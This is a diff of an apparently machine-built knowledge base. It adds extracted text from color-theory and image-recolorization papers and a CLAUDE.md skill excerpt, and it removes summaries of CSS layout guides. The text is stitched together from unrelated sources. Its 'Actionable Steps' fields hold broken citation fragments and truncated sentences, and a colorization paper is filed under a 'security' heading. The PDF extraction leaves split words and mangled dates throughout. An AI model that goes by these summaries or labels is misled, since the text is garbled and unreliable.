+## Yellow-
+orange
+## Yellow
+## Yellow-
+green
+## Green
+## Blue-
+green
+## Blue
+## Blue-
+violet
+## Violet
+## Red-
+violet
+## (a)(b)
+FIGURE 16|The RYB color wheel. These images are used under GNU Free Documentation License.
+## Red
+## Orange
+## Yellow
+## Chartreuse
+green
+## Green
+## Spring
+green
+## Cyan
+## Azure
+## Blue
+## Magenta
+## Rose
+## Violet
+## (a)(b)
+## H
+FIGURE 17|HSV color wheel based on RGB primaries. The left image shows primary, secondary and tertiary hues. The right image show a more
+continuous version of the hues. These images are used under GNU Free Documentation License.
+used to describe complementary colors in art and
+photography.
+## 17
+In general, color design principles suggest a
+number of different strategies for using color. The
+simplest strategy would be to choose amonotone
+achromatic scheme. Such a scheme would not employ
+any color at all, but use black, white, and shades of
+gray. This kind of color scheme is sometimes used
+by interior designers, but while it can be dramatic,
+it also risks being boring. A related scheme is a
+monotone chromatic scheme. Here, a single hue is
+chosen, which is varied in lightness and saturation.
+Again, this type of scheme can be boring. Another
+scheme is ananalogous hues scheme. In such a use of
+color, two or three hues close together in color space
+are used. For example, shades of green or blue greens
+can be used effectively. A more daring use of color is
+acomplementary color scheme. Here complementary
+colors on the color wheel are used. An example using
+the RYB color wheel would be blue and orange
+or the Christmas colors of red and green. Another
+color scheme is thesplit complementary color scheme.
+Instead of choosing the exact complementary color,
+choose colors that are adjacent to the complementary
+color. So that opposite to orange would be blue, but a
+split complementary scheme might choose blue–green
+and blue–violet. Usually one would want the split
+complementary hues to be also different in brightness
+and somewhat desaturated. A final strategy is atriad
+color scheme. Here one can choose three colors equally
+spaced around the color wheel. As with the split
+complementary scheme, two of the hues should be
+desaturated.
+1162011 John Wiley & Sons, Inc.Volume 3, March/April 2011
+
+WIREs Computational StatisticsColor theory and design
+Examples of these schemes are found in US
+postage stamps. These stamps are often design with
+the color principles in mind. The 2010 Katherine Hep-
+burn stamp is an example of the monotone achromatic
+scheme. The 2010 Holiday Evergreens Forever stamp
+is a good example of the monotone chromatic scheme.
+The 2010 Love stamp is a good example of an analo-
+gous hues scheme. The 2008 Winter Holidays stamp
+has four different designs which illustrate the com-
+plementary color scheme. The 2010 Lunar New Year
+stamp is a good example of the triad color scheme.
+While we cannot reproduce these stamps here, their
+images are easily found on the web.
+Figure 17 illustrates the HSV color wheel with
+only the fully saturated colors indicated. The use of
+this color wheel for color design has also been used,
+although we do not pursue that idea for this article.
+Color as a Cultural Expression
+Color, of course, also evokes emotion, which, to a
+large extent, is culturally based. Green
+## 12
+makes sug-
+gestions of these responses:
+•red: urgency, passion, heat, love, blood
+•purple: wealth, royalty, sophistication, intelli-
+gence
+•blue: truth, dignity, power, coolness, melancholy,
+heaviness
+•black: death, rebellion, strength, evil
+•white: purity, cleanliness, lightness, emptiness
+•yellow: warmth, cowardice, brightness
+•green: nature, health, cheerfulness, environment,
+money, vegetation.
+These, of course, are based primarily on impres-
+sions from a Western culture. We do not discuss this
+dimension of color at any length except to note that
+there can be an emotional response to color so that the
+use of color in data and scientific visualization should
+be approached with these possible responses in mind.
+## CONCLUSIONS
+We have all experienced color to some extent, even
+those who have limited color vision. In this article, we
+have tried to systematically lay out principle of color
+theory and design with the goal of making sense in the
+development of scientific and data visualization soft-
+ware. By understanding color theory, the functioning
+of the human visual system, and basic color design
+principles, we hope that the reader will appreciate
+good usage of color when he or she sees it and will
+employ these principles when designing displays.
+## ACKNOWLEDGEMENTS
+This article is based on lectures given by one of us (E.J.W.) in graduate courses inStatistical Data Miningand
+inScientific and Statistical Visualization. Much of the discussion in the Section on Color Deficiencies in Human
+Vision and the Subsection on Hard-Wired Perception isbased on material in Green (2004). The inspiration of
+Marc Green is hereby gratefully acknowledged.
+## REFERENCES
+- Goldsmith TH. Optimization, constraint, and history in
+the evolution of eyes.QRevBiol1990, 65:281–322.
+- Munsell AH.A Color Notation. Boston, MA: G. H.
+## Ellis Co; 1905.
+- Munsell AH. A pigment color system and notation.Am
+J Psychol1912, 23:236–244. doi:10.2307/1412843
+- CIE.Commission Internationale de l’Eclairage Proceed-
+ings, 1931. Cambridge: Cambridge University Press;
+## 1932.
+- Smith T, Guild J. The C.I.E. colorimetric standards
+and their use.Trans Opt Soc1931–1932, 33: 73–134.
+doi:10.1088/1475-4878/33/3/301
+- Wright WD. A re-determination of the trichromatic
+coefficients of the spectral colours.Trans Opt Soc1928,
+30: 141–164. doi:10.1088/1475-4878/30/4/301
+- Guild J. The colorimetric properties of the spectrum.
+Philos Trans R Soc Lond (Ser A)1931, A230: 149–187.
+- Lee H-C.Introduction to Color Imaging Science.Cam-
+bridge: Cambridge University Press; 2005.
+- Crayola Website. http://www.crayola.com/colorcensus/
+history/chronology.cfm.  (Accessed  November  30,
+## 2010).
+- Jameson KA, Highnote SM, Wasserman LM. Richer
+color experience in observers with multiple photopig-
+ment opsin genes.Psychonom Bull Rev2001, 8:
+## 244–261.
+Volume 3, March/April 20112011 John Wiley & Sons, Inc.117
+
+## Overview
+www.wiley.com/wires/compstats
+- Hayutin A.How Population Aging Differs Across
+Countries: A Briefing on Global Demographics.Stan-
+ford, CA: Stanford Center on Longevity; 2007.
+- Green M. 2004. http://www.visualexpert.com/. (Ac-
+cessed November 30, 2010).
+- LuoQ,WegmanE,FuX.CrystalVision,aVisualData
+Mining package for Windows, 2000.
+- Newton I.Opticks. London: The Royal Society; 1704.
+- Goethe JWv.Zur Farbenlehre. Dortmund: Harenberg
+Kommunikation; 1810 (Republished 1979).
+- Chevreul M-E. De la Loi du Contraste Simultan
+## ́
+edes
+Couleurs et de l’assortiment des Objets Color
+## ́
+es, 1839.
+- Mante H.Color Design in Photography.NewYork:
+## Van Nostrand Reinhold; 1972.
+## FURTHER READING
+Eddy WF. An introduction to color systems,Stat Comput Stat Graph Newslett1990, 1:7–10.
+Editors of Time-Life Books.Color. New York: Time Life Books; 1970.
+Mante H.Photo Design: Picture Composition for Black and White Photography. New York: Van Nostrand Reinhold; 1971.
+1182011 John Wiley & Sons, Inc.Volume 3, March/April 2011
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, performance, vcs, api]
+
 ### 📘 KNOWLEDGE: NEXUS_CSS-LAYOUT.MD
 
 # CSS Layouts and Responsive Design
@@ -3275,339 +11499,119 @@ The spec is in development. The currently agreed-upon name is "grid lanes" (e.g.
 
 
 
-## 🎓 DATABASE WISDOM DISTILLATION [v1109] - 26/05/2026
+## 🎓 DATABASE WISDOM DISTILLATION [v2228] - 26/05/2026
 > **Protocol**: Autonomous Intelligence Extraction | **Focus**: Actionable Tech Insights
 
-### 📄 Implementation Steps
-> **Origin**: `guides/user-experience/[calculate-with-intrinsic-sizes.md](NEXUS_CALCULATE-WITH-INTRINSIC-SIZES.MD)` | **Distilled At**: 26/05/2026
+### 📄 Junho Cho, Sangdoo Yun, Kyoungmu Lee, Jin Young Choi
+> **Origin**: `database/NEXUS_CHO_PALETTENET_IMAGE_RECOLORIZATION_CVPR_2017_PAPER.MD` | **Distilled At**: 26/05/2026
 
-#### 💡 Content Summary:
-`calc-size()` is a CSS function for performing mathematical operations on intrinsic sizing keywords like `auto`, `min-content`, and `fit-content`. **MANDATORY**: Use `calc-size()` only when you need to modify an intrinsic size with a calculation or constraint; for simple keyword-based animations (e.g., `0` to `auto`), you must use `interpolate-size: allow-keywords`.
+#### 🧐 Core Insights (Distilled):
+Conclusion
+We have proposed PaletteNet that automatically recolors
+an image with a given target color palette. Contrary to re-
+colorization by the existing method using a color transfer
+function, PaletteNet extracts the content features and com-
+bines them with the target palette to perform content-aware
+recolorization in a data-driven way. As shown in the ex-
+periments, it is practically meaningful that PaletteNet out-
+performs the existing recolorization method and has an ex-
+cellent ability comparable to human experts in generating
+recolored images. Furthermore, PaletteNet could make a
+realistic and plausible image in less than a second, while a
+human expert using Adobe Photoshop takes 18 minutes on
+average for the corresponding recoloring work.
 
-
-
-1. **Identify the Intrinsic Basis**: Determine which intrinsic keyword (`auto`, `min-content`, etc.) should form the base of your calculation.
-2. **Define Constraints**: Use CSS math functions like `clamp()`, `min()`, or `max()` within the second argument to enforce design constraints on the intrinsic size.
-3. **MANDATORY: Provide a Fallback**: Always declare a standard sizing keyword or length immediately before the property using `calc-size()` to ensure the layout remains functional in unsupported browsers.
-4. **Apply Logical Properties**: Default to using logical properties like `inline-size` or `block-size` to ensure the calculations respect the document's writing mode.
-5. **Optional: Progressive Enhancement**: Wrap complex layout logic or animations in a `@supports (inline-size: calc-size(auto, size + 0p...
+#### 🛠 Actionable Steps:
+actions
+on Graphics, 34(4):139:1–139:11, 2015.
+[4] I. Goodfellow, J. Pouget-Abadie, and M. Mirza. Generative
+Adversarial Networks.arXiv preprint arXiv: . . ., pages 1–9,
 
 #### 🔗 Traceability:
-- [Source Context]([calculate-with-intrinsic-sizes.md](NEXUS_CALCULATE-WITH-INTRINSIC-SIZES.MD))
+- [Source Context](NEXUS_CHO_PALETTENET_IMAGE_RECOLORIZATION_CVPR_2017_PAPER.MD)
 - [Related Standards](NEXUS_CORE_PRINCIPLES.md)
 
 ---
-### 📄 Styling siblings based on count and index
-> **Origin**: `guides/user-experience/[dynamic-sibling-styling.md](NEXUS_DYNAMIC-SIBLING-STYLING.MD)` | **Distilled At**: 26/05/2026
+### 📄 [CLAUDE.md](NEXUS_CLAUDE.MD)
+> **Origin**: `ui-ux-pro-max-skill-main/[CLAUDE.md](NEXUS_CLAUDE.MD)` | **Distilled At**: 26/05/2026
 
-#### 💡 Content Summary:
-Historically, applying unique styles to each sibling in a list required complex `:nth-child` loops or JavaScript to inject inline styles. Modern CSS provides `sibling-index()` and `sibling-count()` to perform these calculations directly in your stylesheet, enabling dynamic layouts and color systems that automatically adapt as elements are added or removed.
+#### 🛠 Actionable Steps:
+recommendations (SaaS, e-commerce, portfolio)
+- `style` - UI styles (glassmorphism, minimalism, brutalism) + AI prompts and CSS keywords
+- `typography` - Font pairings with Google Fonts imports
+- `color` - Color palettes by product type
+- `landing` - Page structure and CTA strategies
+- `chart` - Chart types and library recommendations
+- `ux` - Best practices and anti-patterns
 
-
-
-You can create a color spectrum across a group of siblings by calculating a unique hue or lightness value for each child. This ensures a consistent gradient effect regardless of the number of items.
-
-```css
-.swatch {
-  /* Calculate hue by dividing the full 360deg circle by total siblings */
-  /* and multiplying by the current element's 1-based index */
-  background-color: hsl(
-    calc(360deg / sibling-count() * sibling-index()),
-    70%,
-    50%
-  );
-}
+**Stack search:**
+```bash
+python3 src/ui-ux-pro-max/scripts/search.py "<query>" --stack <stack>
 ```
-
-
-
-To create symmetrical effects (like a "fan" or centering items), use the total count to find the midpoint of the list.
-
-```css
-.card {
-  /* Find the center index (e.g., 3 if there are 5 siblings) */
-  --center: calc((sibling-count() + 1) / 2);
-
-  /* Rotate items away from the center: negative for left, positive for right */
-  /* center element...
+Available stacks: `html-tailwind` (default), `react`, `nextjs`, `astro`, `vue`, `nuxtjs`, `nuxt-ui`, `svelte`, `swiftui`, `react-native`, `flutter`, `shadcn`, `jetpack-compose`
 
 #### 🔗 Traceability:
-- [Source Context]([dynamic-sibling-styling.md](NEXUS_DYNAMIC-SIBLING-STYLING.MD))
+- [Source Context]([CLAUDE.md](NEXUS_CLAUDE.MD))
 - [Related Standards](NEXUS_CORE_PRINCIPLES.md)
 
 ---
-### 📄 Expose canvas content to browser features
-> **Origin**: `guides/user-experience/[expose-canvas-content-to-browser-features.md](NEXUS_EXPOSE-CANVAS-CONTENT-TO-BROWSER-FEATURES.MD)` | **Distilled At**: 26/05/2026
+
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux]
+
+### 📘 KNOWLEDGE: NEXUS_DISTILLATION_SECURITY.MD
+
+> **VERSION**: v2 | **Last Updated**: 26/05/2026
+
+
+
+## 🎓 SECURITY WISDOM DISTILLATION [v5391] - 26/05/2026
+> **Protocol**: Autonomous Intelligence Extraction | **Focus**: Actionable Tech Insights
+
+### 📄 Colorization Through Text-based Palette
+> **Origin**: `security/NEXUS_HYOJIN_BAHNG_COLORING_WITH_WORDS_ECCV_2018_PAPER.MD` | **Distilled At**: 26/05/2026
+
+#### 🧐 Core Insights (Distilled):
+Conclusions
+We proposed a generative model that can produce multiple palettes from rich
+text input and colorize grayscale images using the generated palettes.Evalua-
+tion results confirm that our TPN can generate plausible color palettes from
+text input and can incorporate the multimodal nature of colors. Qualitative re-
+sults on our PCN also show that the diverse colors in a palette are effectively
+reflected in the colorization results. Future work includes extending our model
+to a broader range of tasks requiring color recommendation and conductingthe
+detailed analysis of our dataset.
+Acknowledgement.This work was partially supported by the National Re-
+search Foundation of Korea (NRF) grant funded by the Korean government
+(MSIP) (No. NRF2016R1C1B2015924). Jaegul Choo is the corresponding au-
+thor.
+
+Text2Colors15
 
 #### 🛠 Actionable Steps:
-Action</button>
-  </div>
-</canvas>
-
-<script>
-  const canvas = document.getElementById("canvas");
-  const gl = canvas.getContext("webgl");
-  const uiElement = document.getElementById("ui-element");
-
-  // Setup WebGL texture...
-  const texture = gl.createTexture();
-  gl.bindTexture(gl.TEXTURE_2D, texture);
-
-  canvas.onpaint = () => {
-    // 1. Update texture with HTML content
-    if (gl.texElementImage2D) {
-      gl.texElementImage2D(
-        gl.TEXTURE_2D,
-        0,
-        gl.RGBA,
-        gl.RGBA,
-        gl.UNSIGNED_BYTE,
-        uiElement,
-      );
-    }
-
-    // ... Render your 3D scene here, calculating htmlElementMVP matrix ...
-
-    // 2. Sync DOM position with 3D scene
-    if (canvas.getElementTransform) {
-      const mvpDOM = new DOMMatrix(Array.from(h
+action [1], and English - French [40]).
+3  Palette-and-Text (PAT) Dataset
+This section introduces our manually curated dataset named Palette-and-Text
+(PAT). PAT contains 10,183 text and five-color palette pairs, where the set of
+five colors in a palette is associated with its corresponding text description as
+shown in Figs. 3(b)-(d). Words vary with respect to their relationships with
+colors; some words are direct color words (e.g., pink, blue, etc.) while others
+evoke a particular set of colors (e.g., autumn or vibrant). To the best of our
+knowledge, there has been no dataset that matches a multi-word text and its
+corresponding 5-color palette. This dataset allows us to train our models for
+predicting semantically consistent color palettes with textual inputs.
+Other Color DatasetsMunroe‘s
 
 #### 🔗 Traceability:
-- [Source Context]([expose-canvas-content-to-browser-features.md](NEXUS_EXPOSE-CANVAS-CONTENT-TO-BROWSER-FEATURES.MD))
-- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
-
----
-### 📄 Overview
-> **Origin**: `guides/user-experience/[navigation-drawer.md](NEXUS_NAVIGATION-DRAWER.MD)` | **Distilled At**: 26/05/2026
-
-#### 🛠 Actionable Steps:
-action patterns that users are accustomed to in native mobile apps.
-
-#### 🔗 Traceability:
-- [Source Context]([navigation-drawer.md](NEXUS_NAVIGATION-DRAWER.MD))
-- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
-
----
-### 📄 Build a Parallax Effect on Scroll
-> **Origin**: `guides/user-experience/[parallax-scroll-effects.md](NEXUS_PARALLAX-SCROLL-EFFECTS.MD)` | **Distilled At**: 26/05/2026
-
-#### 💡 Content Summary:
-A parallax effect on scroll is a visual technique where different layers of content move at varying speeds as the user scrolls down a page. This creates an illusion of depth, with foreground elements appearing to move faster than the background elements, resulting in an engaging and immersive browsing experience. This effect is best achieved using CSS Scroll-Driven Animations, which allow you to link animations to the scroll position of a container.
-
-
-
-Here’s how to create a basic parallax effect:
-
-1.  **Create a wrapper element:** This element simply groups all the layers of the parallax effect together. It is not the scrollable element, so its overflow should be clipped. Also give it a `height` that matches the height of one of the layers of the parallax effect.
-
-    ```html
-    <div class="wrapper">
-      …
-    </div>
-    ```
-
-    ```css
-    .wrapper {
-      overflow: clip;
-      height: 100vh; /* Height of one of the layers of the parallax */
-    }
-    ```
-
-2.  **Declare the layers:** Inside the wrapper, add the individual layers that will move at different speeds.
-
-    ```html
-    <div class="wrapper">
-      <div class="layer">LAYER 0</div>
-      <div...
-
-#### 🔗 Traceability:
-- [Source Context]([parallax-scroll-effects.md](NEXUS_PARALLAX-SCROLL-EFFECTS.MD))
-- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
-
----
-### 📄 1. Define the Button and Panel Relationship
-> **Origin**: `guides/user-experience/[resilient-context-menus-and-nested-dropdowns.md](NEXUS_RESILIENT-CONTEXT-MENUS-AND-NESTED-DROPDOWNS.MD)` | **Distilled At**: 26/05/2026
-
-#### 🛠 Actionable Steps:
-action panel or popover button group is a useful pattern for users to access additional functionality while taking up minimal space. This overlay pattern comes with layout complexity, as the panel must remain tethered to a trigger element while adapting to viewport constraints. Traditionally, this required complex JavaScript libraries (like Popper.js or Floating UI) to calculate positions and handle collisions.
-
-CSS Anchor Positioning provides a declarative, performance-optimized way to handle these relationships entirely in CSS, allowing browsers to manage the positioning and overflow logic natively.
-
-> [!NOTE]
-> This guide demonstrates anchor-positioning and popover mechanics — it does not prescribe a specific accessible UI pattern. The trigger and panel below are shown as a plain *
-
-#### 🔗 Traceability:
-- [Source Context]([resilient-context-menus-and-nested-dropdowns.md](NEXUS_RESILIENT-CONTEXT-MENUS-AND-NESTED-DROPDOWNS.MD))
-- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
-
----
-### 📄 Same Document Transitions
-> **Origin**: `guides/user-experience/[same-document-transitions.md](NEXUS_SAME-DOCUMENT-TRANSITIONS.MD)` | **Distilled At**: 26/05/2026
-
-#### 💡 Content Summary:
-Web sites often provide multiple views of an object, for instance a list of products, and then a detail page for each product. Navigating between the two views often feels disconnected. When a user clicks a product thumbnail to view its details, the thumbnail disappears and a new, larger image appears instantly elsewhere on the screen. This lack of continuity makes it harder for users to track relationships between elements.
-
-
-
-The **View Transitions API** allows you to specify element pairs that exist in different states before and after a transition. When triggering a transition with `document.startViewTransition()` in a Single Page Navigation (SPA), the browser identifies these shared elements by their shared unique `view-transition-name`. It then automatically calculates the difference in their position, size, and styling, and animates them smoothly from the old state to the new state. This transition occurs in the top layer, above even elements with high `z-index` values.
-
-
-
-
-
-For Single-Page Applications (SPAs) or simple state changes, wrap the logic that updates the DOM in `document.startViewTransition`. The browser captures a snapshot of the current state, runs th...
-
-#### 🔗 Traceability:
-- [Source Context]([same-document-transitions.md](NEXUS_SAME-DOCUMENT-TRANSITIONS.MD))
-- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
-
----
-### 📄 Overview
-> **Origin**: `guides/user-experience/[scroll-snap-realtime-feedback.md](NEXUS_SCROLL-SNAP-REALTIME-FEEDBACK.MD)` | **Distilled At**: 26/05/2026
-
-#### 💡 Content Summary:
-Users expect immediate visual feedback when interacting with UI elements like carousels or galleries. Traditional scroll snap only provides feedback *after* the scroll gesture completes and the element settles. By using Scroll Snap Events, specifically `scrollsnapchanging`, you can provide real-time feedback during the scroll gesture, highlighting the pending snap target before the user releases their touch or mouse.
-
-
-
-
-Attach an event listener for `scrollsnapchanging` to the scroll container. This event fires when the browser determines a new snap target is likely to be selected.
-
-```javascript
-const container = document.querySelector('#gallery');
-const thumbnails = document.querySelectorAll('.thumbnail');
-const items = document.querySelectorAll('.gallery-item');
-
-container.addEventListener('scrollsnapchanging', (event) => {
-  // Highlight pending snap target during scroll for real-time feedback.
-  const pendingTarget = event.snapTargetInline;
-  const index = [...items].indexOf(pendingTarget);
-
-  if (index === -1 || !thumbnails[index]) return;
-
-  // Use lightweight class toggle to avoid layout thrashing during rapid events.
-  // Note: aria-current is NOT toggl...
-
-#### 🔗 Traceability:
-- [Source Context]([scroll-snap-realtime-feedback.md](NEXUS_SCROLL-SNAP-REALTIME-FEEDBACK.MD))
-- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
-
----
-### 📄 Implementation
-> **Origin**: `guides/user-experience/[scroll-snap-state-sync.md](NEXUS_SCROLL-SNAP-STATE-SYNC.MD)` | **Distilled At**: 26/05/2026
-
-#### 💡 Content Summary:
-Synchronizing UI state with a scrollable container's snap position traditionally required complex scroll event listeners, manual calculations of scroll offsets, and intersection observers. The `scrollsnapchange` event provides a native, efficient way to detect when a scroller has settled on a new snap target, making it useful for synchronizing sidebars or highlighting the active section in a table of contents.
-
-
-
-
-The container must have `scroll-snap-type` defined, and have children with `scroll-snap-align` for the browser to track snap targets. In a long article with a table of contents, you can use this to snap section headers to the top of the viewport.
-
-```css
-main {
-    /* Enable scroll snapping on the container */  
-  scroll-snap-type: y proximity;
-  overflow-y: auto;
-}
-
-h2 {
-  /* Define how headers align when snapped */
-  scroll-snap-align: start;
-}
-```
-
-
-Use the `scrollsnapchange` event on the scroll container to react when the user finishes scrolling and the browser snaps to a new element. In our TOC demo, we use this to highlight the active link in the sidebar.
-
-```html
-<!-- MANDATORY: Wrap table of contents links inside a proper navigation landmar...
-
-#### 🔗 Traceability:
-- [Source Context]([scroll-snap-state-sync.md](NEXUS_SCROLL-SNAP-STATE-SYNC.MD))
-- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
-
----
-### 📄 Scrollytelling
-> **Origin**: `guides/user-experience/[scrollytelling.md](NEXUS_SCROLLYTELLING.MD)` | **Distilled At**: 26/05/2026
-
-#### 💡 Content Summary:
-Scrollytelling is a popular technique used to create engaging and immersive web experiences. It involves animating elements on a page as the user scrolls, effectively telling a story or guiding the user through a narrative. With CSS Scroll-Driven Animations, you can create these effects directly in CSS, without needing to rely on JavaScript. The animations are controlled by the scroll position, not a time-based clock, which ensures they are always in sync with the user's scroll.
-
-
-
-To create a scrollytelling experience, you need two sets of elements: one to track the scroll position and another to be animated.
-
-First, define a named `view-timeline` on the elements you want to track. These will act as the drivers for your animations.
-
-```css
-
-  section:nth-child(1){ view-timeline: --tl-1 block; }
-  section:nth-child(2){ view-timeline: --tl-2 block; }
-  section:nth-child(3){ view-timeline: --tl-3 block; }
-  section:nth-child(4){ view-timeline: --tl-4 block; }
-  section:nth-child(5){ view-timeline: --tl-5 block; }
-}
-```
-
-Next, apply animations to the elements you want to animate and link them to the timelines you just created using the `animation-timeline` property....
-
-#### 🔗 Traceability:
-- [Source Context]([scrollytelling.md](NEXUS_SCROLLYTELLING.MD))
-- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
-
----
-### 📄 Search hidden content
-> **Origin**: `guides/user-experience/[search-hidden-content.md](NEXUS_SEARCH-HIDDEN-CONTENT.MD)` | **Distilled At**: 26/05/2026
-
-#### 💡 Content Summary:
-Web interfaces often hide content from view to improve the user experience, save screen space, or increase page performance. Traditional methods like `display: none` or `visibility: hidden` work to hide content visually, but they also make that content completely inaccessible to screen readers and browser features like "Find in page".
-
-To hide content visually but still allow it to be searchable by users and enable it to be deep linked to via URL fragments and "Scroll to Text Fragment" links, you can use either the HTML `<details>` element or the `hidden="until-found"` attribute. The `<details>` element is generally recommended as it's simpler to implement and maintain, but there are some more complex cases where `<details>` is not sufficient and `hidden="until-found"` is required.
-
-For example:
-
-- If you want full control over the styling of the show/hide mechanism.
-- If the UI controls to show/hide the content are in another part of the DOM.
-- If you don't want to support hiding the content after it's shown.
-
-
-
-The `<details>` element has searchable and accessible text by default, and no special implementation is required. Prefer using `<details>` over `hidden="until-...
-
-#### 🔗 Traceability:
-- [Source Context]([search-hidden-content.md](NEXUS_SEARCH-HIDDEN-CONTENT.MD))
-- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
-
----
-### 📄 Stack Drill Down
-> **Origin**: `guides/user-experience/[stack-drill-down.md](NEXUS_STACK-DRILL-DOWN.MD)` | **Distilled At**: 26/05/2026
-
-#### 🛠 Actionable Steps:
-action patterns users expect from native mobile apps.
-
-#### 🔗 Traceability:
-- [Source Context]([stack-drill-down.md](NEXUS_STACK-DRILL-DOWN.MD))
-- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
-
----
-### 📄 Swipe to remove
-> **Origin**: `guides/user-experience/[swipe-to-remove.md](NEXUS_SWIPE-TO-REMOVE.MD)` | **Distilled At**: 26/05/2026
-
-#### 🛠 Actionable Steps:
-action that hooks directly into the browser's scrolling engine. This ensures high performance and physics-based momentum without needing a complex JavaScript gesture library.
-
-The same pattern works for any single-action swipe (remove, archive, mark as read, snooze). The action visuals change; the mechanics do not.
-
-#### 🔗 Traceability:
-- [Source Context]([swipe-to-remove.md](NEXUS_SWIPE-TO-REMOVE.MD))
+- [Source Context](NEXUS_HYOJIN_BAHNG_COLORING_WITH_WORDS_ECCV_2018_PAPER.MD)
 - [Related Standards](NEXUS_CORE_PRINCIPLES.md)
 
 ---
 
 
 ---
-> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, performance]
+> **METADATA (NEXUS SEMANTIC TAGS)**: [database]
 
 ### 📘 KNOWLEDGE: NEXUS_DISTILLATION_TDD.MD
 
@@ -7774,6 +15778,1566 @@ Test untuk membuktikan system berpikir.
 ---
 > **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, tdd, api]
 
+### 📘 KNOWLEDGE: NEXUS_OPENL-2605051413.MD
+
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+> Lan S./MAA ,25(1), 1-6
+> Copyright: ©202 5.This is an open-access article distributed under the terms of the Creative Commons Attribution License.
+> (https://creativecommons.org/license s/by/4.0/ ).
+
+352 
+
+# 352 
+
+# Mediterranean Archaeology and Ar chaeometry 
+
+202 5, 25(1), 1436 
+
+ISSN :2241-8121  
+
+> https :// www .maajournal .com /
+
+Research Article 
+
+# A Study of the Role of Color in Visual Communication in the 
+
+# Digital Perspective 
+
+Hanlu Lyu *              
+
+> 1PHD candidate,Art and Convergence, Daejin University, Pocheon, Gyeonggi-do, 11159, South Korea
+> *Corresponding Author: lyuhanlu1010@163.com
+
+Citation: Lyu , H. (202 5). A Study of the Role of Color in Visual Communication in the Digital Perspective . Mediterranean 
+
+Archaeology and Archaeometry, 25(1), 352 -357 .
+
+ARTICLE INFO 
+
+Received: 07 May 202 4
+
+Accepted: 23 May 20 24 
+
+ABS TRACT 
+
+Color in digital visual communication not only has the function of visual attraction, but also can convey 
+
+rich information and connotation through its unique emotional properties. Different colors can trigger 
+
+different emotional responses from the audience, thus effectively guiding the audience's visual focus 
+
+and emotional resonance. Therefore, we propose to study the role of color in visual communication 
+
+under the digital perspective. First, we briefly describe the digital technology and visual 
+
+communication technology, and conduct a basic research. Based on this, the emotional effects of 
+
+different colors in visual communication are compared. We analyze the role of color in visual 
+
+communication under digital vision from four aspects: emotional communication, visual guidance, 
+
+associative function, culture, and branding, and combine them with the rules and characteristics of 
+
+digital visual communication to present more possibilities and bring more immersive visual experience 
+
+to the audience. 
+
+Keywords: Digital visual field; Color differentiation; Visual communication; Visual processing; 
+
+Real-time data acquisition; Digitization technology. 
+
+INTRODUCTION 
+
+Visual communication is an important means of information dissemination, which has shown unprecedented vitality and 
+
+potential in the digital field of vision [1] . Color, as one of the important elements of visual communication, has become more and 
+
+more prominent in the digital field of vision, and is worth studying and exploring in depth [2] . In the digital field of vision, color is 
+
+no longer just a visual embellishment, but has become an important carrier of information transmission and emotional 
+
+expression [3] . Through the use of color, designers can more accurately convey information, guide the audience's emotions, and 
+
+realize the effective dissemination of information [4] . Meanwhile, with the continuous progress of digital technology, the use of 
+
+color has become more diversified and flexible, providing more possibilities for visual communication. Therefore, we propose to 
+
+study the role of color in visual communication in the digital field. From the perspective of color psychology, color can trigger 
+
+people's emotional resonance and stimulate their emotions and reactions [5] . In the digital field of vision, designers can create 
+
+different atmospheres and situations through the selection and matching of colors, thus affecting the audience's psychological 
+
+state and behavioral responses [6] . For example, warm colors can bring people a warm and comfortable feeling, while cool colors 
+
+may trigger calm and rational thinking [7] . Therefore, in visual communication, the rational use of color can be more effective in 
+
+conveying information and realize the precise positioning of information [8] . In addition, with the aid of digital technology, the 
+
+use of color and multi-dimensional fusion effect has also been greatly improved, to a certain extent, simplifying the complexity of 
+
+color management [9] . In addition, the popularity of digital technology also provides more possibilities for color innovation. 
+
+Designers can create richer and more diverse color effects through digital means, injecting new vitality and creativity into visual 
+
+communication [10] . It also helps learners understand the value and meaning of color in information communication, and 
+
+provides designers with more scientific and effective color application methods and strategies [11] . Through continuous 
+
+exploration and practice, the power of color can be brought into full play, injecting new impetus and vitality into the development 
+
+of visual communication [12] .
+
+1 DIGITAL TECHNOLOGY AND VISUAL COMMUNICATION TECHNOLOGY Lyu H. / MAA , 25(1), 352-357           
+
+> Mediterranean Archaeology and Archaeometry, Vol. 25,No 1,(202 5), pp. 352 -357
+
+353 
+
+Digitization technology is a technology that converts various types of information into digital form for processing [13] . This 
+
+technology breaks through the limitations of traditional information processing to a certain extent, enabling information to be 
+
+transmitted, stored and processed with unprecedented speed and precision. Whether it is text, images, sound or video, they can 
+
+all be converted into digital signals through digitization technology to achieve efficient transmission and sharing. The advantages 
+
+of this technology are its efficiency, convenience and accuracy [14] . Digitization technology provides powerful support for the easy 
+
+acquisition and transmission of information, whether it is remote communication across geographic space or large-scale data 
+
+processing and analysis [15] . At the same time, digitization technology allows for accurate reproduction and preservation of 
+
+information, avoiding the loss and distortion of information that may occur in traditional methods [16] .
+
+Visual communication technology, on the other hand, is a perfect combination of art and technology, which generally 
+
+conveys information to the audience effectively through visual symbols, images, colors and other elements. With its unique charm, 
+
+visual communication technology has become an important means of information dissemination in modern society [17] . By using 
+
+visual elements such as graphics, text and colors, and through clever combination and layout, it creates attractive and infectious 
+
+visual works, thus attracting the audience's attention and guiding them to understand and accept the information conveyed [18] .
+
+At the same time, visual communication technology is also the key to branding and promotion [19] . Through unique design styles 
+
+and visual elements, visual communication technology can help brands establish a unique image and enhance brand awareness 
+
+and reputation [20] . Whether it is logo design, product packaging, or advertising posters, brochures, etc., visual communication 
+
+technology is indispensable [21] .
+
+2 THE EMOTIONAL EFFECTS OF DIFFERENT COLORS FOR VISUAL COMMUNICATION 
+
+As a kind of non-verbal expression, color has a direct and strong emotional effect. Different colors can trigger different 
+
